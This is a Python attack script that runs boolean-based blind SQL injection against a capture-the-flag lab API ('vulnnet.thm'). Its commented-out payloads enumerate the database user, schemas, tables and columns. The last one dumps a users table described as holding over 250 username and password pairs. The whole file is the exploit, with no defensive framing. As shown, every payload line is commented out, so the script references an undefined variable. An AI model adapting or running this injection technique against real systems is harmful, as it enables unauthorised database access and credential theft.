#!/usr/bin/env python3

import requests
import string

url = "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1"

characters = string.ascii_lowercase + string.digits + "-" + "_" + "." + ","
info = ""
session = requests.Session()
counter = 1
done = 0

while True:
    for i in characters:
        
        #Get the SQL user
        #exploit = f" and substring(user(), {counter}, 1) = '{i}'"
        
        #Get schema names
        #exploit = f" and substring((select group_concat(schema_name) from information_schema.schemata), {counter}, 1) = '{i}'"

        #Get table names in "blog" schema
        #exploit = f" and substring((select group_concat(table_name) from information_schema.tables where table_schema='blog'), {counter}, 1) = '{i}'"
        
        #Get table names in "vn_admin" schema
        #exploit = f" and substring((select group_concat(table_name) from information_schema.tables where table_schema='vn_admin'), {counter}, 1) = '{i}'"

        #Get column names in "be_users" table in "vn_admin" schema
        #exploit = f" and substring((select group_concat(column_name) from information_schema.columns where table_name='be_users' and table_schema='vn_admin'), {counter}, 1) = '{i}'"

        #Get column names in "users" table in "blog" schema
        #exploit = f" and substring((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='blog'), {counter}, 1) = '{i}'"

        #Dump the "users" table in the "blog" schmea (250+ credential pairs)
        #exploit = f" and substring((select json_arrayagg(concat_ws(":", username, password)) from users), {counter}, 1) = '{i}'"
        
        attempt = session.get(url + exploit)

        if "Windows Search" not in attempt.text:
            print(f"Trying {''.join(info)}{i}")

        else:
            info = info + i
            print(f"Found: {''.join(info)}{i}")
            counter += 1
            done = 0

        # Check if were done
        if i == ".":
            done += 1

        if done == 2:
            print(f"\nExfil: {info}")
            exit()